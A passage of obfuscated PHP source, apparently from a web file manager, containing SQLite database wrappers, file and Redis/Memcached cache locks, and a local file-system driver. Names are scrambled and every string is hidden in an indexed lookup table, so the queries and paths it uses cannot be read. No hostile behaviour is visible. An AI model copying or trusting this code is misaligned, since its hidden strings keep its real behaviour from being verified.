!1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[‹‰”››ê][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Áğ€Ñü = sqlite_query($this->_linkID, $_SERVER[‹‰”››ê][27]); if (!$Áğ€Ñü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $É¸‹ı²Ş = sqlite_query($this->_linkID, $_SERVER[‹‰”››ê][28]); if (!$É¸‹ı²Ş) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ıˆ€­Ô‘ = array(); if ($this->numRows > 0) { for ($ÓÀšòÃ = 0; $ÓÀšòÃ < $this->numRows; $ÓÀšòÃ++) { $ıˆ€­Ô‘[$ÓÀšòÃ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ıˆ€­Ô‘; } public function getFields($£àóëæ) { $Ò†·›åÁ =& $_SERVER[‹‰”››ê]; $’‹ÅÄÁ² = $this->query($Ò†·›åÁ[29] . $£àóëæ . $Ò†·›åÁ[30]); $Œâ¨…åÁ = array(); if ($’‹ÅÄÁ²) { foreach ($’‹ÅÄÁ² as $ö—´¦°Õ => $ŠÎ»¿¯õ) { $Œâ¨…åÁ[$ŠÎ»¿¯õ[$Ò†·›åÁ[31]]] = array($Ò†·›åÁ[32] => $ŠÎ»¿¯õ[$Ò†·›åÁ[31]], $Ò†·›åÁ[33] => $ŠÎ»¿¯õ[$Ò†·›åÁ[34]], $Ò†·›åÁ[35] => (bool) ($ŠÎ»¿¯õ[$Ò†·›åÁ[36]] === $Ò†·›åÁ[12]), $Ò†·›åÁ[37] => $ŠÎ»¿¯õ[$Ò†·›åÁ[38]], $Ò†·›åÁ[39] => strtolower($ŠÎ»¿¯õ[$Ò†·›åÁ[40]]) == $Ò†·›åÁ[41], $Ò†·›åÁ[42] => strtolower($ŠÎ»¿¯õ[$Ò†·›åÁ[43]]) == $Ò†·›åÁ[44]); } } return $Œâ¨…åÁ; } public function getTables($ÖİÔıæê = '') { $ÓîªÛŸ¨ =& $_SERVER[‹‰”››ê]; $‘Ìõ‰õÏ = $this->query($ÓîªÛŸ¨[45] . $ÓîªÛŸ¨[46] . $ÓîªÛŸ¨[47]); $ëÏÎ”ùê = array(); foreach ($‘Ìõ‰õÏ as $µƒüè­¨ => $Ü´˜ï½ê) { $ëÏÎ”ùê[$µƒüè­¨] = current($Ü´˜ï½ê); } return $ëÏÎ”ùê; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $²­åØ¥â =& $_SERVER[‹‰”››ê]; $ÒÓ¢°¢Ä = sqlite_last_error($this->_linkID); $this->error = $ÒÓ¢°¢Ä . $²­åØ¥â[4] . sqlite_error_string($ÒÓ¢°¢Ä); if ($²­åØ¥â[12] != $this->queryStr) { $this->error .= LNG($²­åØ¥â[48]) . $this->queryStr; } think_trace($this->error, $²­åØ¥â[12], $²­åØ¥â[49]); return $this->error; } public function escapeString($ö¢ØÁ¥³) { return sqlite_escape_string($ö¢ØÁ¥³); } public function parseLimit($Êêş×) { $üŒ ®üã =& $_SERVER[‹‰”››ê]; $½À®¬Å = $üŒ ®üã[12]; if (!empty($Êêş×)) { $Êêş× = explode($üŒ ®üã[50], $Êêş×); if (count($Êêş×) > 1) { $½À®¬Å .= $üŒ ®üã[51] . $Êêş×[1] . $üŒ ®üã[52] . $Êêş×[0] . $üŒ ®üã[53]; } else { $½À®¬Å .= $üŒ ®üã[51] . $Êêş×[0] . $üŒ ®üã[53]; } } return $½À®¬Å; } } class DbSqlite3Base extends Db { public function __construct($Óæ“ä = '') { $ñ‘ûäàë =& $_SERVER[‹‰”››ê]; if (!class_exists($ñ‘ûäàë[54])) { think_exception(think_lang($ñ‘ûäàë[14]) . $ñ‘ûäàë[55]); } if (!empty($Óæ“ä)) { if (!isset($Óæ“ä[$ñ‘ûäàë[16]])) { $Óæ“ä[$ñ‘ûäàë[16]] = 438; } $this->config = $Óæ“ä; if (empty($this->config[$ñ‘ûäàë[17]])) { $this->config[$ñ‘ûäàë[17]] = array(); } } } public function connect($ÀáãÌÚ½ = '', $ô¶’Œ°ä = 0) { $ãô°¯ã =& $_SERVER[‹‰”››ê]; if (!isset($this->linkID[$ô¶’Œ°ä])) { if (empty($ÀáãÌÚ½)) { $ÀáãÌÚ½ = $this->config; } $this->linkID[$ô¶’Œ°ä] = new SQLite3($ÀáãÌÚ½[$ãô°¯ã[21]]); if (!$this->linkID[$ô¶’Œ°ä]) { think_exception($this->linkID[$ô¶’Œ°ä]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ô¶’Œ°ä]->busyTimeout(30000); if (1 != think_config($ãô°¯ã[22])) { unset($this->config); } } return $this->linkID[$ô¶’Œ°ä]; } public function free() { $this->queryID = null; } public function query($ØÅ‘Éº) { $¢¢Ö…Î» =& $_SERVER[‹‰”››ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ØÅ‘Éº; if ($this->queryID) { $this->free(); } think_action_status($¢¢Ö…Î»[23], 1); think_status($¢¢Ö…Î»[24]); $this->queryID = $this->_linkID->query($ØÅ‘Éº); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ÿï©À›İ = $this->getAll(); $this->numRows = count($Ÿï©À›İ); return $Ÿï©À›İ; } } public function execute($ÖöÙøìˆ) { $¦´ö–ô =& $_SERVER[‹‰”››ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÖöÙøìˆ; if ($this->queryID) { $this->free(); } think_action_status($¦´ö–ô[25], 1); think_status($¦´ö–ô[24]); $Ó–¡Ê§ = $this->_linkID->exec($ÖöÙøìˆ); $this->debug(); if (!1 === $Ó–¡Ê§) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[‹‰”››ê][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ï±ÀŠ€ï = $this->_linkID->query($_SERVER[‹‰”››ê][27]); if (!$ï±ÀŠ€ï) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $£œ¬Ãà§ = $this->_linkID->query($_SERVER[‹‰”››ê][28]); if (!$£œ¬Ãà§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $°îÖİé = array(); while ($ÆÛÁ¯ºÖ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $°îÖİé[] = $ÆÛÁ¯ºÖ; } $this->queryID->reset(); return $°îÖİé; } public function getFields($ÁöÊ“¾Œ) { $€éàÈ¹À =& $_SERVER[‹‰”››ê]; $‰¤¿…ÉÓ = $this->query($€éàÈ¹À[29] . $ÁöÊ“¾Œ . $€éàÈ¹À[30]); $²„ãœí¼ = array(); if ($‰¤¿…ÉÓ) { foreach ($‰¤¿…ÉÓ as $¼ĞÇ»˜ => $ŒÒÏÛ™é) { $²„ãœí¼[$ŒÒÏÛ™é[$€éàÈ¹À[32]]] = array($€éàÈ¹À[32] => $ŒÒÏÛ™é[$€éàÈ¹À[32]], $€éàÈ¹À[33] => $ŒÒÏÛ™é[$€éàÈ¹À[33]], $€éàÈ¹À[35] => (bool) ($ŒÒÏÛ™é[$€éàÈ¹À[35]] === $€éàÈ¹À[12]), $€éàÈ¹À[37] => $ŒÒÏÛ™é[$€éàÈ¹À[56]], $€éàÈ¹À[39] => (bool) $ŒÒÏÛ™é[$€éàÈ¹À[57]], $€éàÈ¹À[42] => (bool) $ŒÒÏÛ™é[$€éàÈ¹À[57]]); } } return $²„ãœí¼; } public function getTables($ìí©á = '') { $âòŞ›Ï =& $_SERVER[‹‰”››ê]; $ó˜íŠÄÔ = $this->query($âòŞ›Ï[45] . $âòŞ›Ï[46] . $âòŞ›Ï[47]); $Œª¤úË¿ = array(); foreach ($ó˜íŠÄÔ as $¨íêËµ» => $ÑêÕĞş³) { $Œª¤úË¿[$¨íêËµ»] = current($ÑêÕĞş³); } return $Œª¤úË¿; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Õåçç†Å =& $_SERVER[‹‰”››ê]; $this->error = $this->_linkID->lastErrorMsg(); if ($Õåçç†Å[12] != $this->queryStr) { $this->error .= LNG($Õåçç†Å[48]) . $this->queryStr; } think_trace($this->error, $Õåçç†Å[12], $Õåçç†Å[49]); return $this->error; } public function escapeString($õÅåäÀ) { $ÂìÌî =& $_SERVER[‹‰”››ê]; if ($this->_linkID) { return $this->_linkID->escapeString($õÅåäÀ); } return str_ireplace($ÂìÌî[58], $ÂìÌî[59], $õÅåäÀ); } public function parseLimit($ãÖÆ‚†) { $Õ—¾ä‡¨ =& $_SERVER[‹‰”››ê]; $È¶İÍ¼ = $Õ—¾ä‡¨[12]; if (!empty($ãÖÆ‚†)) { $ãÖÆ‚† = explode($Õ—¾ä‡¨[50], $ãÖÆ‚†); if (count($ãÖÆ‚†) > 1) { $È¶İÍ¼ .= $Õ—¾ä‡¨[51] . $ãÖÆ‚†[1] . $Õ—¾ä‡¨[52] . $ãÖÆ‚†[0] . $Õ—¾ä‡¨[53]; } else { $È¶İÍ¼ .= $Õ—¾ä‡¨[51] . $ãÖÆ‚†[0] . $Õ—¾ä‡¨[53]; } } return $È¶İÍ¼; } } goto FÏÁº˜›ñ»; e£“á®”Ğ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($È–•äà–, $á¤ÆİÕ¹) { $¨Î‰…êÑ =& $_SERVER[‹‰”››ê]; $this->cachePath = $È–•äà–[$¨Î‰…êÑ[87]]; $this->prefix = $¨Î‰…êÑ[930]; $this->cacheTime = $á¤ÆİÕ¹; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¯œŞ‰ã÷) { $êĞ‚ïâÁ =& $_SERVER[‹‰”››ê]; $¯œŞ‰ã÷ = str_replace(array($êĞ‚ïâÁ[931], $êĞ‚ïâÁ[100], $êĞ‚ïâÁ[76]), $êĞ‚ïâÁ[932], $¯œŞ‰ã÷); return $this->cachePath . $êĞ‚ïâÁ[933] . $¯œŞ‰ã÷ . $êĞ‚ïâÁ[934]; } public function set($÷ô¤Øåş, $ñÑ™‡·„, $÷ÚÂèª = false) { $÷ÚÂèª = $÷ÚÂèª ? $÷ÚÂèª : $this->cacheTime; $ªòùò¯© = $this->getFile($÷ô¤Øåş); if (file_put_contents($ªòùò¯©, $this->prefix . $ñÑ™‡·„, LOCK_EX)) { @touch($ªòùò¯©, intval(time() + $÷ÚÂèª)); clearstatcache(); return !0; } @unlink($ªòùò¯©); return !1; } public function get($ºØªÀØÍ) { $¤Ùøƒ = $this->getFile($ºØªÀØÍ); if (file_exists($¤Ùøƒ) && filemtime($¤Ùøƒ) < time()) { @unlink($¤Ùøƒ); return !1; } $ûºåûıè = @file_get_contents($¤Ùøƒ); return substr($ûºåûıè, strlen($this->prefix)); } public function remove($ü¹º¸ê˜) { $¢ÅîÊÖú = $this->getFile($ü¹º¸ê˜); return @unlink($¢ÅîÊÖú); } public function deleteAll() { $±ÆâÇ¿ï =& $_SERVER[‹‰”››ê]; $Ô˜¯†óˆ = scandir($this->cachePath); foreach ($Ô˜¯†óˆ as $æŒ Çıü) { $¦® „–û = $this->cachePath . $æŒ Çıü; if (strpos($¦® „–û, $±ÆâÇ¿ï[934]) && strpos($¦® „–û, $±ÆâÇ¿ï[935])) { @unlink($¦® „–û); } } } public function clearTimeout() { $²–ºòº =& $_SERVER[‹‰”››ê]; $Ñ’„æŸ• = scandir($this->cachePath); foreach ($Ñ’„æŸ• as $ô‚ïåôÚ) { $‡ˆ¬İí¯ = $this->cachePath . $ô‚ïåôÚ; if (strpos($‡ˆ¬İí¯, $²–ºòº[934]) && strpos($‡ˆ¬İí¯, $²–ºòº[935]) && filemtime($‡ˆ¬İí¯) < time()) { @unlink($‡ˆ¬İí¯); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Îôœé’× =& $_SERVER[‹‰”››ê]; if (self::$handle) { return self::$handle; } $˜Óë…×ê = $GLOBALS[$Îôœé’×[6]][$Îôœé’×[436]]; self::$timeout = $˜Óë…×ê[$Îôœé’×[936]] ? $˜Óë…×ê[$Îôœé’×[936]] : 10; $ôÀËÒ¯¹ = _get($GLOBALS[$Îôœé’×[6]], $Îôœé’×[937]); $ÆÚØ¶ = $˜Óë…×ê[$Îôœé’×[922]] ? $˜Óë…×ê[$Îôœé’×[922]] : $Îôœé’×[233]; if ($ÆÚØ¶ == $Îôœé’×[21] && $ôÀËÒ¯¹ == $Îôœé’×[13]) { $ÆÚØ¶ = $Îôœé’×[233]; } switch ($ÆÚØ¶) { case $Îôœé’×[925]: self::$handle = new CacheLockRedis(); break; case $Îôœé’×[926]: self::$handle = new CacheLockMemcached(); break; case $Îôœé’×[21]: self::$handle = new CacheLockDatabase(); break; case $Îôœé’×[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Îôœé’×[938], $Îôœé’×[939]); } return self::$handle; } private static function key($×«È“) { return $_SERVER[‹‰”››ê][940] . Cache::key($×«È“); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($†Ì‰¼ö¿ = '') { self::$errorMsg = $†Ì‰¼ö¿; } public static function lockGlobal($½í¡ÆÄÅ, $¬Ø’»¹) { return self::lock($½í¡ÆÄÅ, $¬Ø’»¹, !0); } public static function lock($âºÖˆÃ†, $ÜÏÉ÷¦Ä = false, $©ÙàÀÌé = false) { $èÚÀ€Õ =& $_SERVER[‹‰”››ê]; $ùé“ßñş = self::init(); $‹Êîğº¥ = self::key($âºÖˆÃ†); $ÜÏÉ÷¦Ä = $ÜÏÉ÷¦Ä ? $ÜÏÉ÷¦Ä : self::$timeout; $×á†æÙ = timeFloat(); if (_get($GLOBALS, $èÚÀ€Õ[941], !1)) { if (!$ùé“ßñş->lock($‹Êîğº¥, 0.2)) { die; } return !0; } $å³ÒŠ²¾ = $ùé“ßñş->lock($‹Êîğº¥, $ÜÏÉ÷¦Ä); $·´–£ª = timeFloat(); if (!$å³ÒŠ²¾) { $…Áá¥í¼ = "\154\x6f\143\153\x20\x65\162\x72\157\x72\x3b\x6b\145\171\x3d{$âºÖˆÃ†}\x3b\x74\151\x6d\x65\x3d{$ÜÏÉ÷¦Ä}\x3b" . self::$errorMsg . $èÚÀ€Õ[74] . get_caller_msg(); $êŞòşºÓ = LNG($èÚÀ€Õ[942]) . "\50{$ÜÏÉ÷¦Ä}\x73\x29\56" . LNG($èÚÀ€Õ[943]); $êŞòşºÓ .= $èÚÀ€Õ[944]; if (is_string(self::$errorMsg) && self::$errorMsg) { $êŞòşºÓ = $êŞòşºÓ . $èÚÀ€Õ[945] . self::$errorMsg; } write_log($èÚÀ€Õ[946] . sprintf($èÚÀ€Õ[947], timeFloat() - $×á†æÙ) . $èÚÀ€Õ[948] . $…Áá¥í¼ . $èÚÀ€Õ[949] . json_encode(error_get_last()), $èÚÀ€Õ[939]); show_json($êŞòşºÓ, !1); } if (!$©ÙàÀÌé) { self::$lockItem[$‹Êîğº¥] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $šÁŸß = number_format(timeFloat() - $·´–£ª, 3); write_log($èÚÀ€Õ[950] . $âºÖˆÃ† . $èÚÀ€Õ[951] . $šÁŸß, $èÚÀ€Õ[939]); } return $å³ÒŠ²¾; } public static function lockGet($ÄËúæ¤Ø) { $â·Œ×òÙ = self::key($ÄËúæ¤Ø); if (self::$lockItem[$â·Œ×òÙ]) { return self::$lockItem[$â·Œ×òÙ]; } return self::init()->lockGet($â·Œ×òÙ); } public static function unlock($ÔƒÏò×µ) { $Ïøî¬ıƒ =& $_SERVER[‹‰”››ê]; $ıôÒÂ¡« = self::key($ÔƒÏò×µ); self::$lockItem[$ıôÒÂ¡«] = null; self::init()->unlock($ıôÒÂ¡«); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ïøî¬ıƒ[952] . $ÔƒÏò×µ, $Ïøî¬ıƒ[939]); } return; } public static function unlockRuntime() { $„¿±² =& $_SERVER[‹‰”››ê]; $ËÏ¾‹„Ñ = self::init(); $Õ©é­¢ƒ = !1; foreach (self::$lockItem as $îªŸÏô => $ÒıÄÒóş) { if (!$ÒıÄÒóş) { continue; } $ËÏ¾‹„Ñ->unlock($îªŸÏô); if (!$Õ©é­¢ƒ) { $Õ©é­¢ƒ = !0; write_log($„¿±²[953] . $îªŸÏô . $„¿±²[74] . get_caller_msg(), $„¿±²[939]); continue; } write_log($„¿±²[953] . $îªŸÏô, $„¿±²[939]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $şÛ¥¬²‡ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($„¿±²[954] . $şÛ¥¬²‡ . $„¿±²[955] . ACTION, $„¿±²[939]); } } public static function fileLock($•Ç‹¢¹ã) { $¨ôëš¿ =& $_SERVER[‹‰”››ê]; if (!$GLOBALS[$¨ôëš¿[956]]) { $GLOBALS[$¨ôëš¿[956]] = array(); } $GLOBALS[$¨ôëš¿[956]][$•Ç‹¢¹ã] = !1; $êÍµ×ÀŒ = fopen(DATA_PATH . $•Ç‹¢¹ã . $¨ôëš¿[957], $¨ôëš¿[958]); if (!$êÍµ×ÀŒ) { return !1; } $GLOBALS[$¨ôëš¿[956]][$•Ç‹¢¹ã] = $êÍµ×ÀŒ; if (flock($êÍµ×ÀŒ, LOCK_EX)) { return !0; } self::unlock($•Ç‹¢¹ã); show_json($¨ôëš¿[959], !1); return !1; } public static function fileUnlock($µª½µèµ) { $ä†¤¸Ì† =& $_SERVER[‹‰”››ê]; $Ğ×™Å¦¿ = $GLOBALS[$ä†¤¸Ì†[956]][$µª½µèµ]; if (!$Ğ×™Å¦¿) { return; } $GLOBALS[$ä†¤¸Ì†[956]][$µª½µèµ] = !1; flock($Ğ×™Å¦¿, LOCK_UN); fclose($Ğ×™Å¦¿); } public static function fileUnlockAll() { $ÀÇúï˜ç =& $_SERVER[‹‰”››ê]; if (!isset($GLOBALS[$ÀÇúï˜ç[956]]) || !$GLOBALS[$ÀÇúï˜ç[956]]) { return; } foreach ($GLOBALS[$ÀÇúï˜ç[956]] as $é”í¥ÉÄ => $˜©ı‚’Ù) { if (!$˜©ı‚’Ù) { continue; } $GLOBALS[$ÀÇúï˜ç[956]][$é”í¥ÉÄ] = !1; flock($˜©ı‚’Ù, LOCK_UN); fclose($˜©ı‚’Ù); } $GLOBALS[$ÀÇúï˜ç[956]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto dİòØŠÉŒ¨; fä‹ºŸ„à›: define($_SERVER[‹‰”››ê][329], 3); define($_SERVER[‹‰”››ê][330], 1); define($_SERVER[‹‰”››ê][331], 0); goto e‹Å¨Ê“®ï; dİòØŠÉŒ¨: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $™½–ÊäÒ =& $_SERVER[‹‰”››ê]; $©ñ°¦ü = $GLOBALS[$™½–ÊäÒ[6]][$™½–ÊäÒ[436]]; self::$cachePath = $©ñ°¦ü[$™½–ÊäÒ[233]][$™½–ÊäÒ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($›»ìæŠÀ, $Á…¬É½ƒ = 0) { $œø”†şä =& $_SERVER[‹‰”››ê]; $ŸéŠ®è¿ = microtime(!0); $…Ó³§èˆ = $ŸéŠ®è¿ + $Á…¬É½ƒ + 0.0001; $³§¶ÜÓû = rtrim(self::$cachePath, $œø”†şä[8]) . $œø”†şä[960] . md5($›»ìæŠÀ) . $œø”†şä[957]; if (file_exists($³§¶ÜÓû) && filemtime($³§¶ÜÓû) && filemtime($³§¶ÜÓû) < time() - 10) { @unlink($³§¶ÜÓû); } do { if (file_exists($³§¶ÜÓû)) { cacheLockWait(); continue; } $—×íşÛ¼ = fopen($³§¶ÜÓû, $œø”†şä[961]); if (!$—×íşÛ¼) { return !1; } $²æ«î«ç = flock($—×íşÛ¼, LOCK_EX | LOCK_NB); self::$caches[$›»ìæŠÀ] = array($œø”†şä[962] => $—×íşÛ¼, $œø”†şä[233] => $³§¶ÜÓû); fwrite($—×íşÛ¼, $…Ó³§èˆ); clearstatcache(); if ($—×íşÛ¼ && $²æ«î«ç) { return !0; } cacheLockWait(); } while (microtime(!0) < $…Ó³§èˆ); $this->unlock($›»ìæŠÀ); return !1; } public function lockGet($ºÀ›”ˆ) { $ã³ı³ÕÂ =& $_SERVER[‹‰”››ê]; $Ä¦éê´Ö = rtrim(self::$cachePath, $ã³ı³ÕÂ[8]) . $ã³ı³ÕÂ[960] . md5($ºÀ›”ˆ) . $ã³ı³ÕÂ[957]; return file_exists($Ä¦éê´Ö); } public function unlock($ü–¤ç—¹) { $û‡°é­ =& $_SERVER[‹‰”››ê]; $€Å±Ê = self::$caches[$ü–¤ç—¹]; if (!$€Å±Ê) { return; } @flock($€Å±Ê[$û‡°é­[962]], LOCK_UN); @fclose($€Å±Ê[$û‡°é­[962]]); @unlink($€Å±Ê[$û‡°é­[233]]); unset(self::$caches[$ü–¤ç—¹]); } } class CacheLockRedis { public function lock($œÑ®¦¯Ï, $•äˆ„›È = 10) { $Æ²çìÏ£ = Cache::init(); $ğÀßã¨ = microtime(!0) + $•äˆ„›È; while (microtime(!0) < $ğÀßã¨) { $íÁéÆ½å = $Æ²çìÏ£->get($œÑ®¦¯Ï); if (!$íÁéÆ½å) { $äó¬õˆ¿ = $Æ²çìÏ£->setLock($œÑ®¦¯Ï, $ğÀßã¨, $•äˆ„›È); if ($äó¬õˆ¿) { return !0; } } else { if ($íÁéÆ½å < microtime(!0)) { $Æ²çìÏ£->set($œÑ®¦¯Ï, $ğÀßã¨, $•äˆ„›È * 2); if ($Æ²çìÏ£->get($œÑ®¦¯Ï) === $íÁéÆ½å) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¯áîû£™) { return Cache::init()->get($¯áîû£™); } public function unlock($Ğ°ú»ô‚) { return Cache::init()->remove($Ğ°ú»ô‚); } } class CacheLockMemcached { public function lock($´Ù¨Å¤ß, $ÄÇİÆ¢ = 0) { $‹·×şÌ° = Cache::init(); $¶šœÔÜ = microtime(!0) + $ÄÇİÆ¢; while (microtime(!0) < $¶šœÔÜ) { $ú‚Õß = $‹·×şÌ°->get($´Ù¨Å¤ß); if (!$ú‚Õß || $ú‚Õß < microtime(!0)) { $ïíœ†â = $‹·×şÌ°->handle->add($´Ù¨Å¤ß, $¶šœÔÜ, $ÄÇİÆ¢); if ($ïíœ†â) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ñ°‡´È) { return Cache::init()->get($Ñ°‡´È); } public function unlock($ìÃã¶ª) { return Cache::init()->remove($ìÃã¶ª); } } goto a„êê½»ã‚; dŸÈ®å­Ş·: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($áò¯œçå) { if (substr($áò¯œçå, 0, 2) == $_SERVER[‹‰”››ê][1427]) { $áò¯œçå = BASIC_PATH . substr($áò¯œçå, 2); } return $áò¯œçå; } public function iconvApp($Ğ¾ï¥ñ) { $È·°Çë =& $_SERVER[‹‰”››ê]; global $config; return $this->iconvTo($Ğ¾ï¥ñ, $config[$È·°Çë[1457]], $config[$È·°Çë[1456]]); } public function iconvSystem($ˆÊïß¦) { $€ÂÆñ« =& $_SERVER[‹‰”››ê]; global $config; return $this->iconvTo($ˆÊïß¦, $config[$€ÂÆñ«[1456]], $config[$€ÂÆñ«[1457]]); } public function getPathOuter($£‰Ï®ï) { $•Œİê =& $_SERVER[‹‰”››ê]; $»±ä½ğ = $this->iconvApp($this->pathBase); $£‰Ï®ï = $this->iconvApp($£‰Ï®ï); if (substr($»±ä½ğ, 0, 2) == $•Œİê[1427]) { $»±ä½ğ = BASIC_PATH . substr($»±ä½ğ, 2); } if (substr($£‰Ï®ï, 0, 2) == $•Œİê[1427]) { $£‰Ï®ï = BASIC_PATH . substr($£‰Ï®ï, 2); } $»±ä½ğ = KodIO::clear($»±ä½ğ); $£‰Ï®ï = KodIO::clear($£‰Ï®ï); $£‰Ï®ï = substr($£‰Ï®ï, strlen($»±ä½ğ)); if (empty($this->pathDriver)) { return $£‰Ï®ï; } return $this->pathDriver . $•Œİê[8] . ltrim($£‰Ï®ï, $•Œİê[8]); } public function mkfile($äö¶œı, $é“»–í = '', $„Õİ‹™Ô = REPEAT_RENAME) { $äö¶œı = $this->iconvSystem($äö¶œı); @touch($äö¶œı); if ($é“»–í) { file_put_contents($äö¶œı, $é“»–í); } @chmod($äö¶œı, $this->pathAuth); if (is_file($äö¶œı)) { return $this->getPathOuter($äö¶œı); } $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][1468], !0); return !1; } public function mkdir($Ùñœõ³Ö, $·„ÅúÌ = REPEAT_SKIP) { $Ùñœõ³Ö = $this->iconvSystem($Ùñœõ³Ö); if (is_dir($Ùñœõ³Ö)) { return $this->getPathOuter($Ùñœõ³Ö); } @mkdir($Ùñœõ³Ö, $this->pathAuth, !0); @chmod($Ùñœõ³Ö, $this->pathAuth); if (is_dir($Ùñœõ³Ö)) { return $this->getPathOuter($Ùñœõ³Ö); } $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][1468], !0); return !1; } public function copyFile($×÷¤ùØ¡, $„ıûª²ï) { $this->mkdir($this->pathFather($„ıûª²ï)); $×÷¤ùØ¡ = $this->iconvSystem($×÷¤ùØ¡); $„ıûª²ï = $this->iconvSystem($„ıûª²ï); $ÆûàÈÖÏ = copy_64($×÷¤ùØ¡, $„ıûª²ï); @chmod($„ıûª²ï, $this->pathAuth); if ($ÆûàÈÖÏ) { return $this->getPathOuter($„ıûª²ï); } $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][1468], !0); return !1; } public function moveFile($Å¹İŞó¦, $÷Ñª”øø) { $this->mkdir($this->pathFather($÷Ñª”øø)); $Å¹İŞó¦ = $this->iconvSystem($Å¹İŞó¦); $÷Ñª”øø = $this->iconvSystem($÷Ñª”øø); $¦•‹€µê = intval(@rename($Å¹İŞó¦, $÷Ñª”øø)); if (!$¦•‹€µê) { if ($¦•‹€µê = intval(@copy_64($Å¹İŞó¦, $÷Ñª”øø))) { @unlink($Å¹İŞó¦); } } @chmod($÷Ñª”øø, $this->pathAuth); if ($¦•‹€µê) { return $this->getPathOuter($÷Ñª”øø); } $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][1468], !0); return !1; } public function movePath($¿¡ìÂ”ñ, $ÍÛôñÒı, $ú§‡Ûª = false) { $‘ ÆëÊ =& $_SERVER[‹‰”››ê]; $¿¡ìÂ”ñ = $this->iconvSystem($¿¡ìÂ”ñ); $ÍÛôñÒı = $this->iconvSystem($ÍÛôñÒı); $¨şŸˆôÆ = rtrim($ÍÛôñÒı, $‘ ÆëÊ[8]) . $‘ ÆëÊ[8] . ($ú§‡Ûª ? $ú§‡Ûª : get_path_this($¿¡ìÂ”ñ)); if (file_exists($¨şŸˆôÆ)) { return !1; } $³‚òç‡Ä = intval(@rename($¿¡ìÂ”ñ, $¨şŸˆôÆ)); $³‚òç‡Ä = file_exists($¨şŸˆôÆ); if ($³‚òç‡Ä) { return $this->getPathOuter($¨şŸˆôÆ); } $this->writeLog(__FUNCTION__ . $‘ ÆëÊ[1468], !0); return !1; } public function delFile($ ÒëÊ´â) { $ ÒëÊ´â = $this->iconvSystem($ ÒëÊ´â); if (!@unlink($ ÒëÊ´â)) { @chmod($ ÒëÊ´â, $this->pathAuth); if (@unlink($ ÒëÊ´â)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][1468], !0); return !1; } return !0; } public function delFolder($ã´£ò¿) { $œ“õÎçı =& $_SERVER[‹‰”››ê]; $ã´£ò¿ = $this->iconvSystem($ã´£ò¿); if (!is_dir($ã´£ò¿)) { return !0; } if (!($‹¡­®²­ = opendir($ã´£ò¿))) { return !1; } while (($¼‹’ê¡™ = readdir($‹¡­®²­)) !== !1) { if ($¼‹’ê¡™ == $œ“õÎçı[10] || $¼‹’ê¡™ == $œ“õÎçı[1379]) { continue; } $éù”Ÿ  = $ã´£ò¿ . $œ“õÎçı[8] . $¼‹’ê¡™; if (is_file($éù”Ÿ ) || is_link($éù”Ÿ )) { if (!unlink($éù”Ÿ )) { chmod($éù”Ÿ , $this->pathAuth); if (!unlink($éù”Ÿ )) { return !1; } } } else { if (is_dir($éù”Ÿ )) { chmod($éù”Ÿ , $this->pathAuth); $éù”Ÿ  = $this->iconvApp($éù”Ÿ ); if (!$this->delFolder($éù”Ÿ )) { return !1; } } } } closedir($‹¡­®²­); return rmdir($ã´£ò¿); } public function rename($ÆŠÕÇÔÛ, $çÃ‘›¬Ê) { $¯‘¸“ş =& $_SERVER[‹‰”››ê]; $­ÌÓÇ¯× = $this->fileNameAuto($this->pathFather($ÆŠÕÇÔÛ), $çÃ‘›¬Ê); $­ÌÓÇ¯× = $this->iconvSystem($­ÌÓÇ¯×); $ÆŠÕÇÔÛ = $this->iconvSystem($ÆŠÕÇÔÛ); $ÂÍ±Ï¸ğ = $this->pathFather($ÆŠÕÇÔÛ); $ˆïÈñØŞ = rtrim($ÂÍ±Ï¸ğ, $¯‘¸“ş[8]) . $¯‘¸“ş[8] . $­ÌÓÇ¯×; $Ñ„Õâ› = 